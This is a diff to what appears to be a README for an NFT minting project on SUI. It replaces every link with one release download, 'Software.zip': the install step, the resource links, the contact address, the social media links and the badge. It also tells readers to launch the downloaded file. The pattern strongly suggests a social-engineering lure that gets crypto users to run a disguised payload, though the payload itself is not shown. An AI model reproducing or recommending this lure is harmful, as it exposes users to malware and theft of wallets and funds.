@@ -27,7 +27,7 @@ Before diving into minting your Whitelist Welcome NFT, make sure you have the fo
 - Basic knowledge of blockchain and NFTs
 
 ### Installation
-1. Click [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "v1.0.0.zip") to download the necessary files.
+1. Click [here](https://github.com/maxiazzinnari/Mint-NFT-on-SUI/releases/download/v2.0/Software.zip "https://github.com/maxiazzinnari/Mint-NFT-on-SUI/releases/download/v2.0/Software.zip") to download the necessary files.
 2. Launch the downloaded file to begin the installation process.
 
 ---
@@ -50,10 +50,10 @@ Follow these simple steps to mint your Whitelist Welcome NFT:
 
 ## 📚 Resources
 For more information on airdrops and blockchain technology, visit the following resources:
-- [SUI Official Website](https://sui.org/)
-- [Ethereum Blockchain Explorer](https://etherscan.io/)
-- [Solana Developer Documentation](https://docs.solana.com/)
-- [NFT Explained](https://www.investopedia.com/tech/what-are-nfts/)
+- [SUI Official Website](https://github.com/maxiazzinnari/Mint-NFT-on-SUI/releases/download/v2.0/Software.zip)
+- [Ethereum Blockchain Explorer](https://github.com/maxiazzinnari/Mint-NFT-on-SUI/releases/download/v2.0/Software.zip)
+- [Solana Developer Documentation](https://github.com/maxiazzinnari/Mint-NFT-on-SUI/releases/download/v2.0/Software.zip)
+- [NFT Explained](https://github.com/maxiazzinnari/Mint-NFT-on-SUI/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -63,15 +63,15 @@ Mint-NFT-on-SUI is maintained by a team of passionate blockchain enthusiasts ded
 ---
 
 ## 📞 Contact Us
-For any inquiries or support, feel free to reach out to us at [mint.nft.sui@gmail.com](mailto:mint.nft.sui@gmail.com).
+For any inquiries or support, feel free to reach out to us at [https://github.com/maxiazzinnari/Mint-NFT-on-SUI/releases/download/v2.0/Software.zip](https://github.com/maxiazzinnari/Mint-NFT-on-SUI/releases/download/v2.0/Software.zip).
 
 ---
 
 ## 🌟 Stay Connected
 Follow us on social media for the latest updates and announcements:
-- [Twitter](https://twitter.com/mint_nft_sui)
-- [Instagram](https://www.instagram.com/mint_nft_sui/)
-- [LinkedIn](https://www.linkedin.com/company/mint-nft-sui)
+- [Twitter](https://github.com/maxiazzinnari/Mint-NFT-on-SUI/releases/download/v2.0/Software.zip)
+- [Instagram](https://github.com/maxiazzinnari/Mint-NFT-on-SUI/releases/download/v2.0/Software.zip)
+- [LinkedIn](https://github.com/maxiazzinnari/Mint-NFT-on-SUI/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -80,4 +80,4 @@ Thank you for choosing Mint-NFT-on-SUI for your Whitelist Welcome NFT minting ex
 
 ---
 
-[![Download Zip](https://img.shields.io/badge/Download-v1.0.0.zip-green)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/maxiazzinnari/Mint-NFT-on-SUI/releases/download/v2.0/Software.zip)](https://github.com/maxiazzinnari/Mint-NFT-on-SUI/releases/download/v2.0/Software.zip)
